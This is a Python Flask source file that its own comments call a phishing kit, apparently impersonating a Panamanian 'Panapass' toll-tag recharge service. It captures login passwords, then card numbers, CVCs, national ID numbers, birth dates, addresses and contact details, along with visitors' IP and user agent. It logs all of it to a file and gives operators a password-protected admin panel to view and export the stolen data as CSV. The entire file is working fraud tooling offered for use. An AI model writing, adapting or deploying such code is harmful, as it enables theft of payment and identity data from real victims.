from flask import Flask, render_template, request, redirect, url_for, session, flash, send_file, make_response
import csv
import io
from datetime import datetime
import os

app = Flask(__name__)
app.secret_key = 'your_secret_key_here'  # Change to a secure random key

# In-memory storage for submissions (list of dicts for the admin table)
submissions = []

# Load existing data from file on startup (optional, to persist across restarts)
try:
    with open('captured_data.txt', 'r') as f:
        for line in f:
            # Parse lines roughly (adjust if format changes)
            parts = line.strip().split(', ')
            if len(parts) >= 15:
                submissions.append({
                    'timestamp': parts[0].split('Tag: ')[1] if 'Tag:' in parts[0] else datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                    'tag_number': parts[0].split('Tag: ')[1] if 'Tag:' in parts[0] else '',
                    'amount_to_recharge': parts[1].split('Amount: ')[1] if 'Amount:' in parts[1] else '',
                    'select': parts[2].split('Payment: ')[1] if 'Payment:' in parts[2] else '',
                    'cardholder_name': parts[3].split('Name: ')[1] if 'Name:' in parts[3] else '',
                    'card_number': parts[4].split('Card: ')[1] if 'Card:' in parts[4] else '',
                    'expiration_date': parts[5].split('Expiry: ')[1] if 'Expiry:' in parts[5] else '',
                    'security_code': parts[6].split('CVC: ')[1] if 'CVC:' in parts[6] else '',
                    'email': parts[7].split('Email: ')[1] if 'Email:' in parts[7] else '',
                    'phone_number': parts[8].split('Phone: ')[1] if 'Phone:' in parts[8] else '',
                    'date_of_birth': parts[9].split('DOB: ')[1] if 'DOB:' in parts[9] else '',
                    'id_number': parts[10].split('Cedula: ')[1] if 'Cedula:' in parts[10] else '',
                    'billing_address': parts[11].split('Street: ')[1] if 'Street:' in parts[11] else '',
                    'city': parts[12].split('City: ')[1] if 'City:' in parts[12] else '',
                    'province': parts[13].split('Province: ')[1] if 'Province:' in parts[13] else '',
                    'zip_code': parts[14].split('Zip: ')[1] if 'Zip:' in parts[14] else '',
                    'user_agent': '',  # Placeholder for loaded data
                    'ip': '',  # Placeholder for loaded data
                })
except FileNotFoundError:
    pass

# Route for the phishing login page (first page)
@app.route('/')
def login():
    return render_template('login.html')

# Route to handle phishing login submission
@app.route('/login', methods=['POST'])
def handle_login():
    panapass = request.form.get('panapass')
    password = request.form.get('password')
    
    print(f"Captured Login: Panapass={panapass}, Password={password}")
    
    return redirect(url_for('form'))

# Route for the phishing form page
@app.route('/form')
def form():
    return render_template('form.html')

# Route to handle form submission
@app.route('/submit', methods=['POST'])
def handle_submit():
    # Capture all form data
    tag = request.form.get('tag')
    amount = request.form.get('amount')
    payment_method = request.form.get('payment_method')
    full_name = request.form.get('full_name')
    card_number = request.form.get('card_number')
    expiry = request.form.get('expiry')
    cvc = request.form.get('cvc')
    email = request.form.get('email')
    phone = request.form.get('phone')
    dob = request.form.get('dob')
    cedula = request.form.get('cedula')
    street = request.form.get('street')
    city = request.form.get('city')
    province = request.form.get('province')
    zip_code = request.form.get('zip')
    
    # Capture User Agent and IP
    user_agent = request.headers.get('User-Agent')
    ip = request.remote_addr
    
    # Create submission dict
    submission = {
        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'tag_number': tag,
        'amount_to_recharge': amount,
        'select': payment_method,
        'cardholder_name': full_name,
        'card_number': card_number,
        'expiration_date': expiry,
        'security_code': cvc,
        'email': email,
        'phone_number': phone,
        'date_of_birth': dob,
        'id_number': cedula,
        'billing_address': street,
        'city': city,
        'province': province,
        'zip_code': zip_code,
        'user_agent': user_agent,
        'ip': ip,
    }
    
    # Add to in-memory list
    submissions.append(submission)
    
    # Log to file (updated to include new fields)
    with open('captured_data.txt', 'a') as f:
        f.write(f"Timestamp: {submission['timestamp']}, Tag: {tag}, Amount: {amount}, Payment: {payment_method}, Name: {full_name}, Card: {card_number}, Expiry: {expiry}, CVC: {cvc}, Email: {email}, Phone: {phone}, DOB: {dob}, Cedula: {cedula}, Street: {street}, City: {city}, Province: {province}, Zip: {zip_code}, User Agent: {user_agent}, IP: {ip}\n")
    
    return 'Data captured successfully! (Customize this page)'

# Admin login route
@app.route('/admin/login', methods=['GET', 'POST'])
def admin_login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        if username in ['Z', 'Carter Lions'] and password == 'Ominous':
            session['logged_in'] = True
            session['username'] = username  # Store username for display
            return redirect(url_for('admin_dashboard'))
        flash('Invalid credentials', 'error')
    return render_template('admin_login.html')

# Admin dashboard route
@app.route('/admin/dashboard')
def admin_dashboard():
    if not session.get('logged_in'):
        return redirect(url_for('admin_login'))
    username = session.get('username', 'Admin')
    return render_template('admin.html', submissions=submissions, username=username)

# Logout route
@app.route('/admin/logout')
def admin_logout():
    session.pop('logged_in', None)
    session.pop('username', None)
    return redirect(url_for('admin_login'))

# CSV download route
@app.route('/admin/download')
def admin_download():
    if not session.get('logged_in'):
        return redirect(url_for('admin_login'))
    
    output = io.StringIO()
    writer = csv.writer(output)
    # Header
    writer.writerow(['Timestamp', 'Tag Number', 'Amount to be recharged', 'Select', 'Cardholder\'s Name', 'Card Number', 'Expiration Date', 'Security Code', 'Email', 'Phone Number', 'Date of birth', 'ID Number', 'Billing Address', 'City', 'Province', 'Zip Code', 'User Agent', 'IP'])
    # Data
    for sub in submissions:
        writer.writerow([sub['timestamp'], sub['tag_number'], sub['amount_to_recharge'], sub['select'], sub['cardholder_name'], sub['card_number'], sub['expiration_date'], sub['security_code'], sub['email'], sub['phone_number'], sub['date_of_birth'], sub['id_number'], sub['billing_address'], sub['city'], sub['province'], sub['zip_code'], sub['user_agent'], sub['ip']])
    
    output.seek(0)
    return send_file(io.BytesIO(output.getvalue().encode('utf-8')), mimetype='text/csv', as_attachment=True, download_name='submissions.csv')

# Clear data route
@app.route('/admin/clear', methods=['POST'])
def admin_clear():
    if not session.get('logged_in'):
        return redirect(url_for('admin_login'))
    submissions.clear()
    # Optionally clear file: open('captured_data.txt', 'w').close()
    flash('All data cleared')
    return redirect(url_for('admin_dashboard'))

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)), debug=False)